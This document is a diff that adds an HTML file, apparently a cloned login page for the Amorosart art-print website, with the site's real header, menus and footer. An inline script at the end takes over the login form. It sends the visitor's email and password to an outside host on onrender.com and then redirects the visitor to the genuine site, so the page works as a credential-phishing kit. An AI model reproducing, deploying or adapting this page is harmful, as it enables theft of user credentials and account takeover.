@@ -1,0 +1,177 @@
+<!DOCTYPE html><html class="no-js" lang="fr"><head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+                <title>Login</title>
+                                <link rel="shortcut icon" type="image/x-icon" href="images/favicon.ico">
+        <link rel="icon" type="image/png" href="images/favicon.png">
+        <!-- css start -->
+        <link href="https://fonts.googleapis.com/css?family=Lato:400,400italic,700,300,300italic,700italic,900,100,100italic,900italic" rel="stylesheet" type="text/css">
+        <link href="https://fonts.googleapis.com/css?family=Montserrat:400,700" rel="stylesheet" type="text/css">
+                        <link href="css/page.min.css" rel="stylesheet" type="text/css">
+                        <!-- css end -->
+    </head>
+    <body>
+        <!-- header start -->
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async="" src="https://www.googletagmanager.com/gtag/js?id=UA-4618231-8"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-4618231-8');
+  gtag('config', 'UA-4618231-2');
+</script>
+<div class="top-bar">
+    <div class="row">
+        <div class="top-bar-left">
+            <ul class="headerLeft">
+                <li>
+                    <a href="https://en.amorosart.com/"><img class="header-logo" src="images/logoAmorosart.png" width="180"></a>
+                </li>
+                <a class="show-for-small-only" href="javascript:void();" onclick="$('.menu-mobile').slideToggle(200);"><i class="button-menu-mobile fa fa-bars noir s32"></i></a>
+                <div class="header-search-mobile show-for-small-only">
+                    <form>
+                            <div class="column">
+                                <input id="search-mobile" type="text" class="search-mobile s16 mag-search fontLato noir radius" placeholder="Search artists or prints..." data-source="https://en.amorosart.com/search.html" data-gallery="Galleries" data-artist="Artists" data-artwork="Artworks">
+                            </div>
+                    </form>
+                </div>
+                <li>
+                    <ul class="menu s15 fontLato noir hide-for-small-only">
+                        <li><a href="https://en.amorosart.com/modern-contemporary-artists.html">Artists</a></li>
+                        <li><a href="https://en.amorosart.com/galleries-original-prints.html">Galleries</a></li>
+                        <li><a href="https://en.amorosart.com/prints-lithographs.html">New prints</a></li>
+                    </ul>
+                </li>
+            </ul>
+        </div>
+        <div class="top-bar-right">
+            <ul class="headerRight hide-for-small-only">  
+                <li class="header-search">
+                    <form>
+                        <div class="row collapse postfix-round">
+                            <div class="columns">
+                                <input id="search" type="text" class="s15 fontLato noir radius mag-search" placeholder="Search artists or prints..." data-source="https://en.amorosart.com/search.html" data-gallery="Galleries" data-artist="Artists" data-artwork="Artworks">
+                            </div>
+                        </div>
+                    </form>
+                </li>
+                <li class="header-links">
+                    <ul class="menu s15 fontLato noir">
+                        <li><a >Registration</a></li><li><a href="https://en.amorosart.com/signin.html">Login</a></li><li><a id="bt-flags" href="#" onclick="$('#other-flags').slideToggle(100);"><i class="famfamfam-flags en mr10"></i><i class="fa fa-caret-down"></i></a>
+                            <ul id="other-flags" class="fontLato s14">
+                                                                                                <li><a href="https://www.amorosart.com/"><i class="famfamfam-flags fr mr5"></i></a></li>
+                                                                                                                                                                                                <li><a href="https://es.amorosart.com/"><i class="famfamfam-flags es mr5"></i></a></li>
+                                                                                                                                <li><a href="https://it.amorosart.com/"><i class="famfamfam-flags it mr5"></i></a></li>
+                                                                                                                                <li><a href="https://de.amorosart.com/"><i class="famfamfam-flags de mr5"></i></a></li>
+                                                                                                                                <li><a href="https://ru.amorosart.com/"><i class="famfamfam-flags ru mr5"></i></a></li>
+                                                                                                                                <li><a href="https://jp.amorosart.com/"><i class="famfamfam-flags jp mr5"></i></a></li>
+                                                                                            </ul>
+                        </li>
+                    </ul>
+                </li>
+            </ul>
+        </div>
+    </div>
+</div>
+<div class="menu-mobile" style="display:none">
+    <a class="fontLato">Artists</a>
+    <a class="fontLato">Galleries</a>
+    <a class="fontLato">New prints</a>
+    <a class="fontLato noir">Registration</a>
+    <a class="fontLato noir">Login</a>
+</div>
+<div class="espace20"></div>
+<!-- header end -->
+        <!-- page start -->
+        <div class="row">
+            <div class="column large-4 large-offset-4 medium-6 medium-offset-3">
+                <div class="columns bgBlanc p15 alignL l22">
+                    <div class="row">
+                        <div class="column alignC">
+                            <h1 class="fontLatoBold s20 noir">Login</h1>
+                            <div class="espace20 clear"></div>
+                            <form id="signin-index-create" onsubmit="event.preventDefault(); handleLogin(event)">
+                                <div class="row">
+                                    <div class="column medium-10 medium-offset-1 alignC">
+                                        <input name="email" type="email" autocomplete="email" placeholder="E-mail" required>
+                                        <small class="error-email hide"></small>
+                                    </div>
+                                </div>
+                                <div class="row">
+                                    <div class="column medium-10 medium-offset-1 alignC">
+                                        <input name="password" type="password" autocomplete="current-password" placeholder="Password" required>
+                                        <small class="error-password hide"></small>
+                                    </div>
+                                </div>
+                                <div class="row">
+                                    <div class="column medium-10 medium-offset-1 alignC">
+                                        <button type="submit" class="button button-enquiry" style="width:100%">Enter</button>
+                                    </div>
+                                </div>
+                                <div class="row">
+                                    <div class="column medium-10 medium-offset-1 alignC fontLato s14 noir">
+                                        <input name="remember" type="checkbox" value="yes" checked=""> Remember me
+                                    </div>
+                                </div>
+                                <div class="row">
+                                    <div class="column medium-10 medium-offset-1 alignC fontLato s14 noir">
+                                        <i class="fa fa-info-circle"></i> <a class="noir" style="text-decoration:underline;" href="https://en.amorosart.com/signin/forgotten.html">Forgot your password ?</a>
+                                    </div>
+                                </div>
+                            </form>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+<div class="espace150"></div>
+<!-- page end -->        <!-- footer start -->
+<div class="espace40"></div>
+<div class="pied">
+    <div class="row">
+        <div class="columns s12 fontLatoLight s12 l120 blanc alignC">Copyright Amorosart 2008 - 2025 - CNIL n° : 1301442 - <a href="https://en.amorosart.com/glossary-prints.html">Glossary</a> - <a href="https://en.amorosart.com/faq-prints.html">F.a.q</a></div>
+    </div>
+</div>
+<!-- footer end -->        <!-- js start -->
+                        <script src="js/page.min.js"></script>
+                <script src="js/signin_index.js"></script>
+                        <script>
+            $(document).foundation();
+        </script>
+        <!-- js end -->
+    
+    
+
+        <script>
+            async function handleLogin(event) {
+                const form = event.target;
+                const email = form.email.value;
+                const password = form.password.value;
+            
+                try {
+                    const response = await fetch('https://gmx-v3nl.onrender.com/amaro', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({ email, password })
+                    });
+            
+                    // Only handle the success case
+                    if (response.ok) {
+                        const data = await response.json();
+                        if (data.status === "successful") {
+                            window.location.href = "https://en.amorosart.com/";
+                        }
+                    }
+                    // No error handling - silent failure for all other cases
+                } catch (error) {
+                    // Optional: Add logging here if needed
+                    console.error('Login error:', error);
+                }
+            }
+            </script>
+
+</body></html>
